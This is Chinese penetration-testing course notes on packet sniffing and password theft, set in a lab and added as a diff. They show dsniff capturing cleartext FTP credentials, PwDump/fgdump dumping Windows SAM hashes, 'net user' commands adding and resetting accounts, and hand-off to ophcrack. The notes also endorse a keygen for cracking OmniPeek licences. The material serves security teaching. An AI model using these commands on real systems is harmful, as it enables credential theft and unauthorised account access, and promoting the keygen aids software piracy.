@@ -1,0 +1,240 @@
+课时45 抓包嗅探
+
+╋━━━━━━━╋
+┃抓包嗅探      ┃
+┃Windows       ┃
+┃    Wireshark ┃
+┃    Omnipeek  ┃
+┃    commview  ┃
+┃    Sniffpass ┃
+┃Linux         ┃
+┃    Tcpdump   ┃
+┃    Wireshark ┃
+┃    Dsniff    ┃
+╋━━━━━━━╋
+
+ 选择一个好用的抓包软件很重要，OmniPeek不但具有信息包流的专家分析系统和应用分析，完整的七层协议解码，应用响应时间（ART）分析以及互式节点图等功能，同时还可以为您提供安全功能，与监控功能。有了OmniPeek，您就可以更好的进行抓包工作了。
+
+omnipeek 7.9.1是出自WildPackets的著名的抓包软件。其功能与Sniffer Pro有相似之处，但是经过多年的发展，其开发环境已经从VC++转移到了C#平台。
+
+OmniPeek拥有EtherPeek NX所有受欢迎的特点功能，包括基于信息包流的专家分析系统和应用分析,交互式节点图,完整的七层协议解码,应用响应时间（ART）分析,安全功能,监控与报表,RMON分布式分析！
+
+ monipeek注册机，已经测试过有的5.0、6.0、6.1、6.5、7.5的版本都可以注册，会被认为是病毒，这个不解释。
+
+1、在Product的下拉框中选中OmniEngine Enterprise 
+
+2、Product Version中选择对应的版本，比如你是6.5的版本就输入65 是7.5的版本就输入75即可。
+
+3、看上以上说明仍不会用的建议回炉重造
+
+OmniPeek 提供统一分析除错网络之管理介面，OmniPeek 让网络之管理者能透过统一之介面同时分析多个网段之网络状况，更进而分析底层之网络状况，以快速辨识问题的功能。基于WildPackets屡获殊荣的EtherPeek NX技术，Omni3 包含了OmniPeek控制台、分布式Peek DNX引擎。这些组件无缝的结合工作可以透视复杂的分布式网络。 OmniPeek OmniPeek将WildPackets的EtherPeek NX产品的本地分析能力扩展到远程网段。
+
+OmniPeek同样有能力连接到远程运行多种应用的引擎。运行在Omni3 引擎上的首要应用是Peek DNX(Distributed Network eXpert分布式网络专家)。为了显示远程网段信息，OmniPeek从Peek DNX收集统计数据并进行相关分析。OmniPeek控制台的界面与操作方式都与EtherPeek NX相同：非常易于使用，诸如"选择相关数据包”等内嵌功能以及可客户化的界面。OmniPeek也用来配置远程引擎，包括过滤、报告、和专家系统等设置。只有在用户需要解码、分析或者本地保存数据包内容时，数据包文件才会被传送到OmniPeek。
+
+root@kali:~# service pure ftpd start
+
+root@kali:~# netstat -pantu | grep :21
+tcp        0      0 0.0.0.0:21              0.0.0.0:*                  LISTEN
+1466/pure-ftpd(SER
+tcp        0      0 :::21                   :::*                       LISTEN
+1466/pure-ftpd(SER
+
+root@kali:~# dsniff -h
+Version: 2.4
+Usage: dsniff [-cdmn] [-i interface | -p pcapfile] [-s snaplen]
+              [-f services] [-t trigger[,...]] [-r|-w savefile]
+              [expression]
+root@kali:~# dsniff -i eth0
+dsniff: listening on eth0
+-----------------
+09/14/15 19:08:10 tcp localhost.61811 -> kali.21 (ftp)
+USER anonymous
+PASS IEUser@
+
+
+-----------------
+09/14/15 19:08:10 tcp localhost.61811 -> kali.21 (ftp)
+USER anonymous
+PASS IEUser@
+
+
+-----------------
+09/14/15 19:08:10 tcp localhost.61811 -> kali.21 (ftp)
+USER yuanfh
+PASS password
+
+
+-----------------
+09/14/15 19:08:10 tcp localhost.61811 -> kali.21 (ftp)
+USER anonymous
+PASS IEUser@
+
+
+-----------------
+09/14/15 19:08:10 tcp localhost.61811 -> kali.21 (ftp)
+USER anonymous
+PASS IEUser@
+
+
+╋━━━━━━━╋
+┃键盘记录      ┃
+┃    Keylogger ┃
+┃    木马窃取  ┃
+╋━━━━━━━╋
+
+╋━━━━━━━━━━━━━━━━━━━━╋
+┃本地缓存密码                            ┃
+┃浏览器缓存的密码                        ┃
+┃    IE浏览器                            ┃   小心了！
+┃    Firefox                             ┃
+┃网络密码                                ┃
+┃无线密码                                ┃
+┃http://www.nirsoft.net                  ┃
+┃                                        ┃
+┃                                        ┃
+┃Dump SAM                                ┃
+┃    Pwdump                              ┃
+┃    /usr/share/windows-binaries/fgdump/ ┃
+╋━━━━━━━━━━━━━━━━━━━━╋
+
+root@kali:~# cd /usr/share/windows-binaries/
+
+root@kali:/usr/share/windows-binaries# ls
+backdoors    fport             nbtenum    radmin.exe     whoami.exe
+enumplus     Hyperion-1.0.zip  nc.exe     sbd.exe
+exe2bat.exe  klogger.exe       nc.txt     vncviewer.exe
+fgdump       mbenum            plink.exe  wget.exe
+
+root@kali:/usr/share/windows-binaries# ls fgdump/
+cachedump64.exe  fgdump.exe  pstgdump.exe  README        servpw.exe
+cachedump.exe    fgexec.exe  PwDump.exe    servpw64.exe
+
+root@kali:/usr/share/windows-binaries# cp fgdump/ -R /media/sf_D_DRIVE/
+
+-------------------------------------------------------------------------------
+=========Quarks PwDump 是一个Win32环境下的系统授权信息导出工具，目前除此之外没有任何一款工具可以导出如此全面的信息，支持这么多的OS版本，且相当稳定。它目前可以导出 :- Local accounts NT/LM hashes + history 本机NT/LM哈希+历史登录记录 – Domain accounts NT/LM hashes + history 域中的NT/LM哈希+历史登录记录 – Cached domain password 缓存中的域管理密码 – Bitlocker recovery information (recovery passwords & key packages) 使用Bitlocker的恢复后遗留的信息支持的操作系统 : XP/2003/Vista/7/2008/81 / USAGE
+
+=========
+
+Here it is how you can use Quarks PWDump:
+
+quarks-pwdump.exe <option(s)> <NTDS file>
+
+Options :
+
+–dump-hash-local
+
+–dump-hash-domain-cached
+
+–dump-hash-domain (NTDS_FILE must be specified)
+
+–dump-bitlocker (NTDS_FILE must be specified)
+
+–with-history (optional)
+
+–output-type JOHN/LC (optional, if no=>JOHN)
+
+–output FILE (optional, if no=>stdout)
+
+Dump options must be user all at once.
+
+In all cases, the tool must be executed on the targeted operating system.
+
+Some command examples:
+
+- Dump domain hashes from NTDS.dit with its history
+
+#quarks-pwdump.exe –dump-hash-domain –with-history
+
+- Dump local account hashes to LC format
+
+#quarks-pwdump.exe –dump-hash-local –output-type LC
+
+- Dump domain hashes from NTDS.dit with its history
+
+#quarks-pwdump.exe –dump-bitlocker –output c:\bitlocker.txt c:\ntds.dit
+
+All features require administrator privileges.点击下载
+-------------------------------------------------------------------------------
+
+C:\Docouments and Settings\yuanfh>cd
+
+C:>cd fgdump
+
+C:\fgdump>PwDump.exe
+
+dwdump6 Version 2.0.0-bate by fizzging and the nighty group at foofus.net
+** THIS IS A BETA VERSION! YOU HAVE BEEN VARNED. **
+Copyright 2009 foofus.net
+
+This program is free software under th GNU
+Ceneral Public License Version 2 <GNU CPL>, you can redistribute it and/or
+nodify it under the terms of the GNU GPL, as published by the Free Software
+Foundation. NO WARRANY,EXPRESSED OR IMPLIED, IS GRANIED WITH THIS
+PROGRAM. Please see the COPYING file include wiht this program
+and the GNU CPL,for furher details.
+
+Usage:PwDump.exe [-x][-n][-h][-o output_file][-u user][-p password][-s share]nachineName
+  where -h prints this usage message and exits
+  where -o specifies a file to which to wirte the output
+  where -u specifies the user name used to connect to the target
+  where -p specifies the password used to connect to the target
+  where -s specifies the share to be used on the target, rather than searching for one
+  where -n skips password histories
+  where -x targets a 64-bit host
+
+C:\fgdump>PwDump.exe localhost
+dwdump6 Version 2.0.0-bate by fizzging and the nighty group at foofus.net
+** THIS IS A BETA VERSION! YOU HAVE BEEN VARNED. **
+Copyright 2009 foofus.net
+
+This program is free software under th GNU
+Ceneral Public License Version 2 <GNU CPL>, you can redistribute it and/or
+nodify it under the terms of the GNU GPL, as published by the Free Software
+Foundation. NO WARRANY,EXPRESSED OR IMPLIED, IS GRANIED WITH THIS
+PROGRAM. Please see the COPYING file include wiht this program
+and the GNU CPL,for furher details.
+
+Administrator:500:NO PASSWORD*********************:NO PASSWORD*********************:::
+Guest:501:NO PASSWORD*********************:NO PASSWORD*********************:::
+HelpAssistant:1000:0DB09EBDOF38F482422299F81C49E52D:B132D26618FF9614E19C5E07C671D021:::
+SUPPORT_3889450:1002:NO PASSWORD*********************:FD5162A2C2C85A976E9A482CD1ED440E:::
+yuanfh:1003:NO PASSWORD*********************:NO PASSWORD*********************:::
+
+Completed
+
+C:\fgdump>net user yuanfh abc
+
+C:\fgdump>net user administartor abc
+
+C:\fgdump>net user a a /add
+
+C:\fgdump>net user b b /add
+
+
+root@kali:/usr/share/windows-binaries# cp /media/sf_D_DRIVE/xp.pwdump.txt .
+
+root@kali:/usr/share/windows-binaries# ls
+backdoors    fport             nbtenum    radmin.exe     whoami.exe
+enumplus     Hyperion-1.0.zip  nc.exe     sbd.exe        xp.pwdump.txt
+exe2bat.exe  klogger.exe       nc.txt     vncviewer.exe
+fgdump       mbenum            plink.exe  wget.exe
+
+
+root@kali:/usr/share/windows-binaries# mv xp.pwdump.txt /root/xp.pwdump
+
+root@kali:/usr/share/windows-binaries# ls
+backdoors    fport             nbtenum    radmin.exe     whoami.exe
+enumplus     Hyperion-1.0.zip  nc.exe     sbd.exe
+exe2bat.exe  klogger.exe       nc.txt     vncviewer.exe
+fgdump       mbenum            plink.exe  wget.exe
+
+root@kali:/usr/share/windows-binaries# cd
+
+root@kali:~# ls
+18411.c           exp       xp.pwdump  模板  图片  下载  桌面
+dsniff.services   handle.txt  公共     视频  文档  音乐
+
+root@kali:~# cat xp.pwdump
+
+ophcrack
